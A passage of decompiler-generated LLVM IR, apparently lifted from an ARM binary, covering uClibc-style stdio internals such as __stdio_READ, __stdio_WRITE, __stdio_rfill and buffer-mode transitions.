  %v4_17df0 = zext i16 %v3_17df0 to i32
  %v1_17df4 = add nsw i32 %v4_17df0, -19
  store i32 %v1_17df4, i32* @r2, align 4
  %v1_17df8 = add nuw nsw i32 %v4_17df0, 7
  %v1_17dfc = and i32 %v1_17df8, 131064
  store i32 %v1_17dfc, i32* @ip, align 4
  %v2_17e04 = add i32 %v1_17dfc, %v0_17e58
  store i32 %v2_17e04, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_17e04, %v2_17dd4
  br i1 %tmp24, label %dec_label_pc_17e10, label %dec_label_pc_17e4c

dec_label_pc_17e10:                               ; preds = %dec_label_pc_17df0
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17e18 = load i32, i32* %r8.global-to-local, align 4
  %v0_17e1c = load i32, i32* %sb.global-to-local, align 4
  %v1_17e20 = load i32, i32* @sp, align 4
  %v2_17e20 = inttoptr i32 %v1_17e20 to i32*
  store i32 0, i32* %v2_17e20, align 4
  %v4_17e24 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_17e18, i32 %v0_17e1c)
  %v0_17e28 = load i32, i32* @r5, align 4
  %v1_17e28 = load i32, i32* %sl.global-to-local, align 4
  %v9_17e28 = icmp eq i32 %v0_17e28, %v1_17e28
  br i1 %v9_17e28, label %dec_label_pc_17e30, label %dec_label_pc_17e94

dec_label_pc_17e30:                               ; preds = %dec_label_pc_17e10
  %v0_17e34 = call i32 @__aeabi_read_tp()
  %v3_17e38 = load i16, i16* @global_var_22068.345, align 2
  %v4_17e38 = sext i16 %v3_17e38 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_17e44 = add i32 %v4_17e38, %v0_17e34
  %v4_17e44 = inttoptr i32 %v3_17e44 to i32*
  store i32 22, i32* %v4_17e44, align 4
  br label %dec_label_pc_17e98

dec_label_pc_17e4c:                               ; preds = %dec_label_pc_17df0
  %v1_17e4c = inttoptr i32 %v0_17e50 to i32*
  %v2_17e4c = load i32, i32* %v1_17e4c, align 4
  %v3_17e4c = add i32 %v0_17e50, 4
  %v4_17e4c = inttoptr i32 %v3_17e4c to i32*
  %v5_17e4c = load i32, i32* %v4_17e4c, align 4
  store i32 %v5_17e4c, i32* @r4, align 4
  %v1_17e50 = add i32 %v0_17e50, 8
  store i32 %v1_17e50, i32* %r8.global-to-local, align 4
  %v1_17e54 = inttoptr i32 %v1_17e50 to i32*
  %v2_17e54 = load i32, i32* %v1_17e54, align 4
  store i32 %v2_17e54, i32* %r8.global-to-local, align 4
  %v3_17e54 = add i32 %v0_17e50, 12
  %v4_17e54 = inttoptr i32 %v3_17e54 to i32*
  %v5_17e54 = load i32, i32* %v4_17e54, align 4
  store i32 %v5_17e54, i32* %sb.global-to-local, align 4
  %v1_17e58 = inttoptr i32 %v0_17e58 to i32*
  store i32 %v2_17e4c, i32* %v1_17e58, align 4
  %v3_17e58 = add i32 %v0_17e58, 4
  %v4_17e58 = inttoptr i32 %v3_17e58 to i32*
  %v5_17e58 = load i32, i32* @r4, align 4
  store i32 %v5_17e58, i32* %v4_17e58, align 4
  %v0_17e5c = load i32, i32* %r8.global-to-local, align 4
  %v1_17e5c = load i32, i32* @r5, align 4
  %v2_17e5c = add i32 %v1_17e5c, 8
  %v3_17e5c = inttoptr i32 %v2_17e5c to i32*
  store i32 %v0_17e5c, i32* %v3_17e5c, align 4
  %v0_17e60 = load i32, i32* %sb.global-to-local, align 4
  %v1_17e60 = load i32, i32* @r5, align 4
  %v2_17e60 = add i32 %v1_17e60, 12
  %v3_17e60 = inttoptr i32 %v2_17e60 to i32*
  store i32 %v0_17e60, i32* %v3_17e60, align 4
  %v0_17e64 = load i32, i32* @ip, align 4
  %v1_17e64 = trunc i32 %v0_17e64 to i16
  %v2_17e64 = load i32, i32* @r5, align 4
  %v3_17e64 = add i32 %v2_17e64, 16
  %v4_17e64 = inttoptr i32 %v3_17e64 to i16*
  store i16 %v1_17e64, i16* %v4_17e64, align 2
  %v0_17e68 = load i32, i32* @r7, align 4
  %v1_17e68 = add i32 %v0_17e68, 18
  %v2_17e68 = inttoptr i32 %v1_17e68 to i8*
  %v3_17e68 = load i8, i8* %v2_17e68, align 1
  %v4_17e68 = zext i8 %v3_17e68 to i32
  store i32 %v4_17e68, i32* @r3, align 4
  %v2_17e6c = load i32, i32* @r5, align 4
  %v3_17e6c = add i32 %v2_17e6c, 18
  %v4_17e6c = inttoptr i32 %v3_17e6c to i8*
  store i8 %v3_17e68, i8* %v4_17e6c, align 1
  %v0_17e70 = call i32 @memcpy()
  %v0_17e74 = load i32, i32* @r7, align 4
  %v1_17e74 = add i32 %v0_17e74, 16
  %v2_17e74 = inttoptr i32 %v1_17e74 to i16*
  %v3_17e74 = load i16, i16* %v2_17e74, align 2
  %v4_17e74 = zext i16 %v3_17e74 to i32
  %v0_17e78 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_17e78, i32* @r5, align 4
  %v2_17e7c = add i32 %v4_17e74, %v0_17e74
  store i32 %v2_17e7c, i32* @r7, align 4
  br label %dec_label_pc_17e80

dec_label_pc_17e80:                               ; preds = %dec_label_pc_17dd0, %dec_label_pc_17e4c
  %v0_17e58 = phi i32 [ %tmp, %dec_label_pc_17dd0 ], [ %v0_17e78, %dec_label_pc_17e4c ]
  %v0_17e50 = phi i32 [ %v1_17d84, %dec_label_pc_17dd0 ], [ %v2_17e7c, %dec_label_pc_17e4c ]
  %v3_17e84 = icmp ult i32 %v0_17e50, %v2_17dd0
  %v1_17e88 = add i32 %v0_17e58, 19
  store i32 %v1_17e88, i32* @r0, align 4
  %v1_17e8c = add i32 %v0_17e50, 19
  store i32 %v1_17e8c, i32* @r1, align 4
  br i1 %v3_17e84, label %dec_label_pc_17df0, label %dec_label_pc_17e94.loopexit

dec_label_pc_17e94.loopexit:                      ; preds = %dec_label_pc_17e80
  %v0_17e94.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17e94

dec_label_pc_17e94:                               ; preds = %dec_label_pc_17e94.loopexit, %dec_label_pc_17e10
  %v1_17e94 = phi i32 [ %v0_17e58, %dec_label_pc_17e94.loopexit ], [ %v0_17e28, %dec_label_pc_17e10 ]
  %v0_17e94 = phi i32 [ %v0_17e94.pre, %dec_label_pc_17e94.loopexit ], [ %v1_17e28, %dec_label_pc_17e10 ]
  %v2_17e94 = sub i32 %v1_17e94, %v0_17e94
  store i32 %v2_17e94, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17e98

dec_label_pc_17e98:                               ; preds = %dec_label_pc_17dc8, %dec_label_pc_17e30, %dec_label_pc_17dac, %dec_label_pc_17e94
  %v0_17e98 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_17d6c, i32* @r5, align 4
  store i32 %v12_17d6c, i32* @r7, align 4
  ret i32 %v0_17e98

; uselistorder directives
  uselistorder i32 %v0_17e50, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_17e58, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_17d84, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 9, 10, 0, 3, 11, 4, 12, 13, 5, 6, 7, 8, 1, 14, 2, 15 }
  uselistorder i32 18, { 9, 10, 8, 0, 1, 2, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 22, { 1, 0, 10, 2, 3, 4, 5, 6, 11, 12, 7, 13, 8, 14, 9, 15 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 4, 0, 3 }
  uselistorder label %dec_label_pc_17e98, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17e80, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17eb0 = load i32, i32* @r4, align 4
  store i32 %v3_17eb0, i32* %stack_var_-12, align 4
  %v0_17eb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_17eb4 = inttoptr i32 %v0_17eb4 to i16*
  %v2_17eb4 = load i16, i16* %v1_17eb4, align 2
  %v3_17eb4 = zext i16 %v2_17eb4 to i32
  store i32 %v3_17eb4, i32* @r3, align 4
  %v1_17eb8 = and i32 %v3_17eb4, 4
  store i32 %v1_17eb8, i32* @r5, align 4
  %v2_17eb8 = icmp eq i32 %v1_17eb8, 0
  store i32 %v0_17eb4, i32* @r4, align 4
  br i1 %v2_17eb8, label %dec_label_pc_17ecc, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_17ecc:                               ; preds = %entry
  %v1_17ecc = icmp slt i32 %arg2, 0
  br i1 %v1_17ecc, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_17ecc
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_17ecc, %bb18
  %v1_17ed4 = add i32 %v0_17eb4, 4
  %v2_17ed4 = inttoptr i32 %v1_17ed4 to i32*
  %v3_17ed4 = load i32, i32* %v2_17ed4, align 4
  store i32 %v3_17ed4, i32* %r0.global-to-local, align 4
  %v1_17ed8 = call i32 @__libc_read(i32 %v3_17ed4)
  store i32 %v1_17ed8, i32* %r0.global-to-local, align 4
  %v5_17ee0 = icmp sgt i32 %v1_17ed8, 0
  br i1 %v5_17ee0, label %.thread7, label %dec_label_pc_17ee4

dec_label_pc_17ee4:                               ; preds = %bb19
  %v2_17edc = icmp eq i32 %v1_17ed8, 0
  %v0_17ee4 = load i32, i32* @r4, align 4
  %v1_17ee4 = inttoptr i32 %v0_17ee4 to i16*
  %v2_17ee4 = load i16, i16* %v1_17ee4, align 2
  br i1 %v2_17edc, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_17ee4
  %v2_17ee8 = or i16 %v2_17ee4, 4
  store i16 %v2_17ee8, i16* %v1_17ee4, align 2
  %v1_17f04.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_17ee4
  %v2_17eec = or i16 %v2_17ee4, 8
  store i16 %v2_17eec, i16* %v1_17ee4, align 2
  %v1_17ef8 = load i32, i32* @r5, align 4
  store i32 %v1_17ef8, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_17f04 = phi i32 [ %v1_17f04.pre, %bb20 ], [ 0, %bb ], [ %v1_17ed8, %bb19 ], [ %v1_17ef8, %bb21 ]
  %v2_17f00 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17f00, i32* @r4, align 4
  ret i32 %v1_17f04

; uselistorder directives
  uselistorder i16 %v2_17ee4, { 1, 0 }
  uselistorder i32 %v1_17ed8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_17fcc2 = icmp eq i32 %arg3, 0
  store i1 %v2_17fcc2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17fcc2, label %dec_label_pc_17fd4, label %dec_label_pc_17f24

dec_label_pc_17f24:                               ; preds = %entry, %dec_label_pc_17fccthread-pre-split.dec_label_pc_17f24_crit_edge
  %v0_17f30 = phi i32 [ %v0_17f30.pre, %dec_label_pc_17fccthread-pre-split.dec_label_pc_17f24_crit_edge ], [ %tmp, %entry ]
  %v0_17f2c = phi i32 [ %v5_17f3c, %dec_label_pc_17fccthread-pre-split.dec_label_pc_17f24_crit_edge ], [ %arg2, %entry ]
  %v3_17f24 = phi i32 [ %v3_17f24.pre, %dec_label_pc_17fccthread-pre-split.dec_label_pc_17f24_crit_edge ], [ 2147483647, %entry ]
  %v0_17f28.in = phi i32 [ %v5_17f40, %dec_label_pc_17fccthread-pre-split.dec_label_pc_17f24_crit_edge ], [ %arg3, %entry ]
  %v3_17f28 = phi i32 [ %v5_17f40, %dec_label_pc_17fccthread-pre-split.dec_label_pc_17f24_crit_edge ], [ %arg3, %entry ]
  %v0_17f28 = icmp slt i32 %v0_17f28.in, 0
  %storemerge = select i1 %v0_17f28, i32 %v3_17f24, i32 %v3_17f28
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_17f2c, i32* %r1.global-to-local, align 4
  %v1_17f30 = add i32 %v0_17f30, 4
  %v2_17f30 = inttoptr i32 %v1_17f30 to i32*
  %v3_17f30 = load i32, i32* %v2_17f30, align 4
  %v3_17f34 = call i32 @__GI___libc_write(i32 %v3_17f30, i32 %v0_17f2c)
  %v1_17f38 = icmp slt i32 %v3_17f34, 0
  %v2_17f38 = icmp eq i32 %v3_17f34, 0
  store i1 %v2_17f38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_17f38, label %dec_label_pc_17f48, label %dec_label_pc_17fccthread-pre-split

dec_label_pc_17f48:                               ; preds = %dec_label_pc_17f24
  %v0_17f48 = load i32, i32* @r4, align 4
  %v1_17f48 = inttoptr i32 %v0_17f48 to i16*
  %v2_17f48 = load i16, i16* %v1_17f48, align 2
  %v1_17f4c = or i16 %v2_17f48, 8
  store i16 %v1_17f4c, i16* %v1_17f48, align 2
  store i32 41220, i32* %r3.global-to-local, align 4
  %v0_17f58 = call i32 @__aeabi_read_tp()
  %v3_17f5c = load i16, i16* @global_var_22068.345, align 2
  %v4_17f5c = sext i16 %v3_17f5c to i32
  store i32 %v4_17f5c, i32* %r3.global-to-local, align 4
  %v2_17f60 = add i32 %v4_17f5c, %v0_17f58
  %v3_17f60 = inttoptr i32 %v2_17f60 to i32*
  %v4_17f60 = load i32, i32* %v3_17f60, align 4
  store i32 %v4_17f60, i32* %r3.global-to-local, align 4
  %v7_17f64 = icmp eq i32 %v4_17f60, 4
  store i1 %v7_17f64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17f64, label %dec_label_pc_17f70, label %bb21

bb21:                                             ; preds = %dec_label_pc_17f48
  %v8_17f68 = icmp eq i32 %v4_17f60, 11
  store i1 %v8_17f68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_17f68, label %dec_label_pc_17f70, label %dec_label_pc_17fd4

dec_label_pc_17f70:                               ; preds = %dec_label_pc_17f48, %bb21
  %v0_17f70 = load i32, i32* @r4, align 4
  %v1_17f70 = add i32 %v0_17f70, 8
  store i32 %v1_17f70, i32* %r2.global-to-local, align 4
  %v1_17f74 = inttoptr i32 %v1_17f70 to i32*
  %v2_17f74 = load i32, i32* %v1_17f74, align 4
  store i32 %v2_17f74, i32* %r2.global-to-local, align 4
  %v3_17f74 = add i32 %v0_17f70, 12
  %v4_17f74 = inttoptr i32 %v3_17f74 to i32*
  %v5_17f74 = load i32, i32* %v4_17f74, align 4
  store i32 %v5_17f74, i32* %r3.global-to-local, align 4
  %v2_17f78 = sub i32 %v5_17f74, %v2_17f74
  store i32 %v2_17f78, i32* %r1.global-to-local, align 4
  %v9_17f78 = icmp eq i32 %v5_17f74, %v2_17f74
  store i1 %v9_17f78, i1* %cpsr_z.global-to-local, align 1
  %v0_17fc4.pre = load i32, i32* @r5, align 4
  br i1 %v9_17f78, label %dec_label_pc_17fc4, label %dec_label_pc_17f80

dec_label_pc_17f80:                               ; preds = %dec_label_pc_17f70
  %v3_17f80 = icmp ult i32 %v2_17f78, %v0_17fc4.pre
  %v9_17f80 = icmp eq i32 %v2_17f78, %v0_17fc4.pre
  store i1 %v9_17f80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17f80, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_17f80
  store i32 %v0_17fc4.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_17f80, %bb22, %dec_label_pc_17fa8
  %v2_17f94 = phi i32 [ %v1_17fac, %dec_label_pc_17fa8 ], [ %v2_17f74, %bb22 ], [ %v2_17f74, %dec_label_pc_17f80 ]
  %v0_17f88 = load i32, i32* @r6, align 4
  %v1_17f88 = inttoptr i32 %v0_17f88 to i8*
  %v2_17f88 = load i8, i8* %v1_17f88, align 1
  %v3_17f88 = zext i8 %v2_17f88 to i32
  store i32 %v3_17f88, i32* %r3.global-to-local, align 4
  %v7_17f8c = icmp eq i8 %v2_17f88, 10
  store i1 %v7_17f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_17f90 = add i32 %v0_17f88, 1
  store i32 %v1_17f90, i32* @r6, align 4
  %v3_17f94 = inttoptr i32 %v2_17f94 to i8*
  store i8 %v2_17f88, i8* %v3_17f94, align 1
  %v0_17f98 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17f98, label %dec_label_pc_17f9c, label %dec_label_pc_17fa8

dec_label_pc_17f9c:                               ; preds = %.preheader
  %v0_17f9c = load i32, i32* @r4, align 4
  %v1_17f9c = inttoptr i32 %v0_17f9c to i16*
  %v2_17f9c = load i16, i16* %v1_17f9c, align 2
  %v3_17f9c = zext i16 %v2_17f9c to i32
  store i32 %v3_17f9c, i32* %r3.global-to-local, align 4
  %v1_17fa0 = and i32 %v3_17f9c, 256
  %v2_17fa0 = icmp eq i32 %v1_17fa0, 0
  store i1 %v2_17fa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17fa0, label %dec_label_pc_17fa8, label %dec_label_pc_17f9c.dec_label_pc_17fb4_crit_edge

dec_label_pc_17f9c.dec_label_pc_17fb4_crit_edge:  ; preds = %dec_label_pc_17f9c
  %v0_17fb8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17fb4

dec_label_pc_17fa8:                               ; preds = %dec_label_pc_17f9c, %.preheader
  %v0_17fa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17fa8 = add i32 %v0_17fa8, -1
  store i32 %v1_17fa8, i32* %r1.global-to-local, align 4
  %v7_17fa8 = icmp eq i32 %v0_17fa8, 1
  store i1 %v7_17fa8, i1* %cpsr_z.global-to-local, align 1
  %v0_17fac = load i32, i32* %r2.global-to-local, align 4
  %v1_17fac = add i32 %v0_17fac, 1
  store i32 %v1_17fac, i32* %r2.global-to-local, align 4
  br i1 %v7_17fa8, label %dec_label_pc_17fa8.dec_label_pc_17fb4_crit_edge, label %.preheader

dec_label_pc_17fa8.dec_label_pc_17fb4_crit_edge:  ; preds = %dec_label_pc_17fa8
  %v0_17fb4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17fb4

dec_label_pc_17fb4:                               ; preds = %dec_label_pc_17f9c.dec_label_pc_17fb4_crit_edge, %dec_label_pc_17fa8.dec_label_pc_17fb4_crit_edge
  %v0_17fb8 = phi i32 [ %v1_17fac, %dec_label_pc_17fa8.dec_label_pc_17fb4_crit_edge ], [ %v0_17fb8.pre, %dec_label_pc_17f9c.dec_label_pc_17fb4_crit_edge ]
  %v0_17fb4 = phi i32 [ %v0_17fb4.pre, %dec_label_pc_17fa8.dec_label_pc_17fb4_crit_edge ], [ %v0_17f9c, %dec_label_pc_17f9c.dec_label_pc_17fb4_crit_edge ]
  %v1_17fb4 = add i32 %v0_17fb4, 8
  %v2_17fb4 = inttoptr i32 %v1_17fb4 to i32*
  %v3_17fb4 = load i32, i32* %v2_17fb4, align 4
  store i32 %v3_17fb4, i32* %r3.global-to-local, align 4
  %v2_17fb8 = add i32 %v0_17fb4, 16
  %v3_17fb8 = inttoptr i32 %v2_17fb8 to i32*
  store i32 %v0_17fb8, i32* %v3_17fb8, align 4
  %v0_17fbc = load i32, i32* %r3.global-to-local, align 4
  %v1_17fbc = load i32, i32* %r2.global-to-local, align 4
  %v2_17fbc = sub i32 %v1_17fbc, %v0_17fbc
  store i32 %v2_17fbc, i32* %r3.global-to-local, align 4
  %v1_17fc0 = load i32, i32* @r5, align 4
  %v2_17fc0 = sub i32 %v1_17fc0, %v2_17fbc
  br label %dec_label_pc_17fc4

dec_label_pc_17fc4:                               ; preds = %dec_label_pc_17f70, %dec_label_pc_17fb4
  %v0_17fc4 = phi i32 [ %v2_17fc0, %dec_label_pc_17fb4 ], [ %v0_17fc4.pre, %dec_label_pc_17f70 ]
  %v1_17fc4 = load i32, i32* @r7, align 4
  %v2_17fc4 = sub i32 %v1_17fc4, %v0_17fc4
  store i32 %v2_17fc4, i32* @r7, align 4
  br label %dec_label_pc_17fd4

dec_label_pc_17fccthread-pre-split:               ; preds = %dec_label_pc_17f24
  %v3_17f3c = load i32, i32* @r6, align 4
  %v5_17f3c = add i32 %v3_17f3c, %v3_17f34
  store i32 %v5_17f3c, i32* @r6, align 4
  %v4_17f40 = load i32, i32* @r5, align 4
  %v5_17f40 = sub i32 %v4_17f40, %v3_17f34
  store i32 %v5_17f40, i32* @r5, align 4
  %v2_17fcc = icmp eq i32 %v5_17f40, 0
  store i1 %v2_17fcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17fcc, label %dec_label_pc_17fd4, label %dec_label_pc_17fccthread-pre-split.dec_label_pc_17f24_crit_edge

dec_label_pc_17fccthread-pre-split.dec_label_pc_17f24_crit_edge: ; preds = %dec_label_pc_17fccthread-pre-split
  %v3_17f24.pre = load i32, i32* @r8, align 4
  %v0_17f30.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17f24

dec_label_pc_17fd4:                               ; preds = %dec_label_pc_17fccthread-pre-split, %entry, %bb21, %dec_label_pc_17fc4
  %v0_17fd4 = load i32, i32* @r7, align 4
  ret i32 %v0_17fd4

; uselistorder directives
  uselistorder i32 %v5_17f40, { 1, 3, 0, 2 }
  uselistorder i32 %v5_17f3c, { 1, 0 }
  uselistorder i32 %v0_17fb4, { 1, 0 }
  uselistorder i32 %v1_17fac, { 0, 2, 1 }
  uselistorder i32 %v0_17fa8, { 1, 0 }
  uselistorder i32 %v0_17fc4.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_17f74, { 1, 0, 2 }
  uselistorder i32 %v2_17f74, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_17f34, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17f2c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 9, 6, 7, 8, 16, 23, 24, 10, 11, 12, 3, 13, 0, 14, 15, 17, 18, 4, 19, 5, 20, 1, 21, 2, 22, 25 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_17fd4, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_17fc4, { 1, 0 }
  uselistorder label %dec_label_pc_17fb4, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17f70, { 1, 0 }
  uselistorder label %dec_label_pc_17f24, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17fe4 = load i32, i32* @r4, align 4
  store i32 %v3_17fe4, i32* %stack_var_-8, align 4
  %v1_17fe8 = add i32 %arg1, 8
  %v1_17fec = inttoptr i32 %v1_17fe8 to i32*
  %v2_17fec = load i32, i32* %v1_17fec, align 4
  store i32 %v2_17fec, i32* @r1, align 4
  %v3_17fec = add i32 %arg1, 12
  %v4_17fec = inttoptr i32 %v3_17fec to i32*
  %v5_17fec = load i32, i32* %v4_17fec, align 4
  %v2_17ff0 = sub i32 %v5_17fec, %v2_17fec
  store i32 %v2_17ff0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_17ff8 = inttoptr i32 %arg1 to i16*
  %v4_17ff8 = call i32 @__stdio_READ(i16* %v3_17ff8, i32 %v2_17fec, i32 %v2_17ff0)
  %v0_17ffc = load i32, i32* @r4, align 4
  %v1_17ffc = add i32 %v0_17ffc, 8
  %v2_17ffc = inttoptr i32 %v1_17ffc to i32*
  %v3_17ffc = load i32, i32* %v2_17ffc, align 4
  store i32 %v3_17ffc, i32* %r2.global-to-local, align 4
  %v2_18000 = add i32 %v3_17ffc, %v4_17ff8
  %v2_18004 = add i32 %v0_17ffc, 20
  %v3_18004 = inttoptr i32 %v2_18004 to i32*
  store i32 %v2_18000, i32* %v3_18004, align 4
  %v0_18008 = load i32, i32* %r2.global-to-local, align 4
  %v1_18008 = load i32, i32* @r4, align 4
  %v2_18008 = add i32 %v1_18008, 16
  %v3_18008 = inttoptr i32 %v2_18008 to i32*
  store i32 %v0_18008, i32* %v3_18008, align 4
  %v2_1800c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1800c, i32* @r4, align 4
  ret i32 %v4_17ff8

; uselistorder directives
  uselistorder i32 %v4_17ff8, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18014 = load i32, i32* @r4, align 4
  store i32 %v3_18014, i32* %stack_var_-12, align 4
  %v0_18018 = load i32, i32* @r0, align 4
  %v1_18018 = inttoptr i32 %v0_18018 to i16*
  %v2_18018 = load i16, i16* %v1_18018, align 2
  %v3_18018 = zext i16 %v2_18018 to i32
  store i32 %v3_18018, i32* %r3.global-to-local, align 4
  %v0_1801c = load i32, i32* @r1, align 4
  %v2_1801c = and i32 %v0_1801c, %v3_18018
  %v4_1801c = icmp eq i32 %v2_1801c, 0
  store i32 %v0_18018, i32* @r4, align 4
  br i1 %v4_1801c, label %dec_label_pc_1802c, label %dec_label_pc_1803c

dec_label_pc_1802c:                               ; preds = %entry
  %v1_1802c = and i32 %v3_18018, 2176
  %v2_1802c = icmp eq i32 %v1_1802c, 0
  br i1 %v2_1802c, label %dec_label_pc_18034, label %dec_label_pc_18048

dec_label_pc_18034:                               ; preds = %dec_label_pc_1802c
  %v2_18034 = or i32 %v0_1801c, %v3_18018
  store i32 %v2_18034, i32* %r3.global-to-local, align 4
  %v1_18038 = trunc i32 %v2_18034 to i16
  store i16 %v1_18038, i16* %v1_18018, align 2
  %v0_1803c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1803c

dec_label_pc_1803c:                               ; preds = %entry, %dec_label_pc_18034
  %v0_1803c = phi i32 [ %v0_18018, %entry ], [ %v0_1803c.pre, %dec_label_pc_18034 ]
  %v1_1803c = inttoptr i32 %v0_1803c to i16*
  %v2_1803c = load i16, i16* %v1_1803c, align 2
  %v3_1803c = zext i16 %v2_1803c to i32
  store i32 %v3_1803c, i32* %r3.global-to-local, align 4
  %v1_18040 = and i32 %v3_1803c, 16
  store i32 %v1_18040, i32* %r5.global-to-local, align 4
  %v2_18040 = icmp eq i32 %v1_18040, 0
  br i1 %v2_18040, label %dec_label_pc_18070, label %dec_label_pc_18048

dec_label_pc_18048:                               ; preds = %dec_label_pc_1802c, %dec_label_pc_1803c
  store i32 40976, i32* %r3.global-to-local, align 4
  %v0_1804c = call i32 @__aeabi_read_tp()
  store i32 %v0_1804c, i32* %r0.global-to-local, align 4
  %v3_18050 = load i16, i16* @global_var_22068.345, align 2
  %v4_18050 = sext i16 %v3_18050 to i32
  store i32 %v4_18050, i32* %r3.global-to-local, align 4
  %v3_18058 = add i32 %v4_18050, %v0_1804c
  %v4_18058 = inttoptr i32 %v3_18058 to i32*
  store i32 9, i32* %v4_18058, align 4
  br label %dec_label_pc_1805c

dec_label_pc_1805c:                               ; preds = %dec_label_pc_18078, %dec_label_pc_18048
  %v0_1805c = load i32, i32* @r4, align 4
  %v1_1805c = inttoptr i32 %v0_1805c to i16*
  %v2_1805c = load i16, i16* %v1_1805c, align 2
  %v3_1805c = zext i16 %v2_1805c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_18064 = or i32 %v3_1805c, 8
  store i32 %v1_18064, i32* %r3.global-to-local, align 4
